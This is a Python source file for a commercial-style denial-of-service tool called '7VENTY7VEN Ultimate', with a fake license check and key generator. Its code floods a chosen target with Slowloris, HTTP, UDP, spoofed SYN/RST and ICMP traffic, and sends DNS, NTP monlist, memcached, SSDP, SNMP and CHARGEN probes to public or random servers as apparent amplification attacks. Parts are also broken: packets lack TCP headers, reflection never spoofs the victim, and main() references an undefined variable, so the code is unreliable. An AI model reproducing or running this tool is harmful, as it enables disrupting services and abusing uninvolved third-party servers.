#!/usr/bin/env python3
"""
7VENTY7VEN ULTIMATE - ALL 15 METHODS
Usage: python3 7.py -t <target> -m <methods> -i <intensity>
"""

import socket
import threading
import random
import time
import sys
import os
import json
import hashlib
import base64
import struct
import datetime
from urllib.parse import urlparse

# ==================== CONFIG ====================

VERSION = "22.0"
CREATOR = "7VENTY7VEN"

# ==================== COLORS (minimal) ====================

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    END = '\033[0m'

# ==================== LICENSE ====================

class License:
    def __init__(self):
        self.hwid = self.get_hwid()
        self.valid = False
        self.type = 'trial'
        self.load()
    
    def get_hwid(self):
        try:
            import uuid
            return hashlib.md5(str(uuid.getnode()).encode()).hexdigest()[:16]
        except:
            return 'unknown'
    
    def check(self, key):
        # Simple check - in real version, validate properly
        return key.startswith('7V7-')
    
    def load(self):
        if os.path.exists('.license'):
            with open('.license', 'r') as f:
                if self.check(f.read().strip()):
                    self.valid = True
                    self.type = 'pro'
    
    def save(self, key):
        with open('.license', 'w') as f:
            f.write(key)
        self.valid = True
    
    def menu(self):
        print(f"\n{Colors.YELLOW}License Required{Colors.END}")
        print(f"HWID: {self.hwid}")
        print("1. Enter key")
        print("2. Trial")
        choice = input("> ")
        if choice == '1':
            key = input("Key: ").strip()
            if self.check(key):
                self.save(key)
                return True
        return False

# ==================== HIT TRACKER ====================

class Hits:
    def __init__(self):
        self.total = 0
        self.by_method = {}
        self.start = time.time()
        self.lock = threading.Lock()
    
    def add(self, method, target, port):
        with self.lock:
            self.total += 1
            self.by_method[method] = self.by_method.get(method, 0) + 1
    
    def stats(self):
        elapsed = time.time() - self.start
        return f" Hits:{self.total} Rate:{self.total/elapsed:.1f}/s"

# ==================== ATTACKS ====================

class Attack:
    def __init__(self, hits):
        self.hits = hits
        self.running = False
        self.threads = []
    
    def stop(self):
        self.running = False

class Slowloris(Attack):
    def start(self, target, threads):
        self.running = True
        parsed = urlparse(target)
        self.host = parsed.netloc or parsed.path
        if ':' in self.host:
            self.host = self.host.split(':')[0]
        self.port = parsed.port or 80
        self.conns = []
        
        def worker():
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(5)
                    s.connect((self.host, self.port))
                    s.send(f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.host}\r\n\r\n".encode()[:50])
                    self.conns.append(s)
                    self.hits.add('SLOWLORIS', self.host, self.port)
                except:
                    pass
                time.sleep(0.1)
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class HTTP(Attack):
    def start(self, target, threads, ssl=False):
        self.running = True
        parsed = urlparse(target)
        self.host = parsed.netloc or parsed.path
        if ':' in self.host:
            self.host = self.host.split(':')[0]
        self.port = parsed.port or (443 if ssl else 80)
        self.ssl = ssl
        
        def worker():
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((self.host, self.port))
                    req = f"GET /{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.host}\r\n\r\n"
                    s.send(req.encode())
                    s.recv(1)
                    s.close()
                    self.hits.add('HTTPS' if ssl else 'HTTP', self.host, self.port)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class UDP(Attack):
    def start(self, ip, port, threads):
        self.running = True
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    data = os.urandom(random.randint(64, 1024))
                    s.sendto(data, (ip, port))
                    self.hits.add('UDP', ip, port)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class TCP_SYN(Attack):
    def start(self, ip, port, threads):
        self.running = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except:
            print(f"{Colors.RED}SYN requires root{Colors.END}")
            return
        
        def worker():
            while self.running:
                try:
                    src_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    # Simple SYN packet
                    packet = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,
                                        socket.inet_aton(src_ip), socket.inet_aton(ip))
                    s.sendto(packet, (ip, 0))
                    self.hits.add('TCP_SYN', ip, port)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class ICMP(Attack):
    def start(self, ip, threads):
        self.running = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except:
            print(f"{Colors.RED}ICMP requires root{Colors.END}")
            return
        
        def worker():
            while self.running:
                try:
                    # ICMP echo request
                    packet = struct.pack('!BBHHH', 8, 0, 0, random.randint(0,65535), 0) + os.urandom(56)
                    s.sendto(packet, (ip, 0))
                    self.hits.add('ICMP', ip, 0)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class DNS(Attack):
    def start(self, ip, threads):
        self.running = True
        servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
        
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    # DNS query
                    tid = random.randint(0,65535)
                    query = struct.pack('>H', tid) + struct.pack('>H', 0x0100)
                    query += struct.pack('>H', 1) + struct.pack('>H', 0)*3
                    query += b'\x03www\x06google\x03com\x00\x00\x01\x00\x01'
                    s.sendto(query, (random.choice(servers), 53))
                    self.hits.add('DNS', ip, 53)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class NTP(Attack):
    def start(self, ip, threads):
        self.running = True
        servers = ['0.pool.ntp.org', '1.pool.ntp.org', 'time.google.com']
        
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    # NTP monlist
                    s.sendto(b'\x17\x00\x03\x2a' + b'\x00'*4, (random.choice(servers), 123))
                    self.hits.add('NTP', ip, 123)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class MEMCACHED(Attack):
    def start(self, ip, threads):
        self.running = True
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    s.sendto(b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n', 
                            (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 11211))
                    self.hits.add('MEMCACHED', ip, 11211)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class SSDP(Attack):
    def start(self, ip, threads):
        self.running = True
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    s.sendto(b'M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n\r\n',
                            ('239.255.255.250', 1900))
                    self.hits.add('SSDP', ip, 1900)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class SNMP(Attack):
    def start(self, ip, threads):
        self.running = True
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    # SNMP GetBulk
                    s.sendto(bytes.fromhex('302902010104067075626c6963a51c02046b053d46020100020100300e300c06082b060102010101000500'),
                            (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 161))
                    self.hits.add('SNMP', ip, 161)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class RST(Attack):
    def start(self, ip, port, threads):
        self.running = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        except:
            print(f"{Colors.RED}RST requires root{Colors.END}")
            return
        
        def worker():
            while self.running:
                try:
                    src = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    packet = struct.pack('!BBHHHBBH4s4s', 0x45,0,40,0,0,64,6,0,
                                        socket.inet_aton(src), socket.inet_aton(ip))
                    s.sendto(packet, (ip, 0))
                    self.hits.add('RST', ip, port)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class CHARGEN(Attack):
    def start(self, ip, threads):
        self.running = True
        def worker():
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while self.running:
                try:
                    s.sendto(b'\x00', (f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}", 19))
                    self.hits.add('CHARGEN', ip, 19)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

class WEBSOCKET(Attack):
    def start(self, target, threads):
        self.running = True
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        if ':' in host:
            host = host.split(':')[0]
        port = parsed.port or 80
        
        def worker():
            while self.running:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((host, port))
                    key = base64.b64encode(os.urandom(16)).decode()
                    req = f"GET / HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
                    s.send(req.encode())
                    s.close()
                    self.hits.add('WEBSOCKET', host, port)
                except:
                    pass
        
        for _ in range(threads):
            t = threading.Thread(target=worker)
            t.daemon = True
            t.start()
            self.threads.append(t)

# ==================== MAIN ====================

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='7VENTY7VEN Ultimate')
    parser.add_argument('-t', '--target', help='Target URL/IP')
    parser.add_argument('-m', '--methods', nargs='+', default=['SLOWLORIS'],
                       choices=['HTTP','HTTPS','UDP','TCP_SYN','TCP_ACK','DNS','NTP',
                               'SLOWLORIS','ICMP','MEMCACHED','SSDP','SNMP',
                               'WEBSOCKET','RST','CHARGEN','ALL'],
                       help='Attack methods')
    parser.add_argument('-i', '--intensity', default='medium',
                       choices=['low','medium','high','extreme','insane'],
                       help='Intensity (threads)')
    parser.add_argument('--threads', type=int, help='Manual thread count')
    parser.add_argument('--port', type=int, help='Target port')
    parser.add_argument('--keygen', action='store_true', help='Generate license')
    
    args = parser.parse_args()
    
    # Key generation
    if args.keygen:
        key = f"7V7-{base64.b64encode(os.urandom(32)).decode()[:48]}"
        print(f"\n{Colors.GREEN}License Key:{Colors.END}")
        print(key)
        return
    
    # Check target
    if not args.target:
        parser.print_help()
        return
    
    # License check
    license = License()
    if not license.valid:
        if not license.menu():
            return
    
    # Parse target
    parsed = urlparse(args.target)
    host = parsed.netloc or parsed.path
    if ':' in host:
        host = host.split(':')[0]
    
    # Get IP
    try:
        ip = socket.gethostbyname(host)
    except:
        ip = host
    
    # Port
    port = args.port or parsed.port or 80
    
    # Threads
    thread_map = {'low':10, 'medium':25, 'high':50, 'extreme':100, 'insane':200}
    threads = args.threads or thread_map.get(args.intensity, 25)
    
    # Methods
    methods = args.methods
    if 'ALL' in methods:
        methods = ['HTTP','HTTPS','UDP','TCP_SYN','DNS','NTP','SLOWLORIS',
                  'ICMP','MEMCACHED','SSDP','SNMP','WEBSOCKET','RST','CHARGEN']
    
    # Create hits tracker
    hits = Hits()
    
    # Start attacks
    attacks = []
    print(f"\n{Colors.BLUE}Target: {target} ({ip}:{port}){Colors.END}")
    print(f"{Colors.BLUE}Threads: {threads}{Colors.END}")
    print(f"{Colors.BLUE}Methods: {', '.join(methods)}{Colors.END}\n")
    
    for method in methods:
        if method == 'SLOWLORIS':
            a = Slowloris(hits)
            a.start(args.target, max(10, threads//4))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ Slowloris{Colors.END}")
        
        elif method == 'HTTP':
            a = HTTP(hits)
            a.start(args.target, threads)
            attacks.append(a)
            print(f"{Colors.GREEN}✓ HTTP{Colors.END}")
        
        elif method == 'HTTPS':
            a = HTTP(hits)
            a.start(args.target, threads, ssl=True)
            attacks.append(a)
            print(f"{Colors.GREEN}✓ HTTPS{Colors.END}")
        
        elif method == 'UDP':
            a = UDP(hits)
            a.start(ip, port, threads)
            attacks.append(a)
            print(f"{Colors.GREEN}✓ UDP{Colors.END}")
        
        elif method == 'TCP_SYN':
            a = TCP_SYN(hits)
            a.start(ip, port, max(5, threads//5))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ TCP_SYN{Colors.END}")
        
        elif method == 'DNS':
            a = DNS(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ DNS{Colors.END}")
        
        elif method == 'NTP':
            a = NTP(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ NTP{Colors.END}")
        
        elif method == 'ICMP':
            a = ICMP(hits)
            a.start(ip, max(5, threads//5))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ ICMP{Colors.END}")
        
        elif method == 'MEMCACHED':
            a = MEMCACHED(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ MEMCACHED{Colors.END}")
        
        elif method == 'SSDP':
            a = SSDP(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ SSDP{Colors.END}")
        
        elif method == 'SNMP':
            a = SNMP(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ SNMP{Colors.END}")
        
        elif method == 'WEBSOCKET':
            a = WEBSOCKET(hits)
            a.start(args.target, max(5, threads//5))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ WEBSOCKET{Colors.END}")
        
        elif method == 'RST':
            a = RST(hits)
            a.start(ip, port, max(5, threads//5))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ RST{Colors.END}")
        
        elif method == 'CHARGEN':
            a = CHARGEN(hits)
            a.start(ip, max(5, threads//10))
            attacks.append(a)
            print(f"{Colors.GREEN}✓ CHARGEN{Colors.END}")
    
    print(f"\n{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}\n")
    
    # Status loop
    try:
        while True:
            time.sleep(1)
            stats = hits.stats()
            sys.stdout.write(f"\r{Colors.BLUE}[{stats}]{Colors.END} ")
            sys.stdout.flush()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}Stopping...{Colors.END}")
        for a in attacks:
            a.stop()
        
        print(f"\n{Colors.GREEN}Final Stats:{Colors.END}")
        for method, count in hits.by_method.items():
            print(f"  {method}: {count}")
        print(f"  Total: {hits.total}")
        print(f"  Time: {time.time()-hits.start:.1f}s")

if __name__ == "__main__":
    main()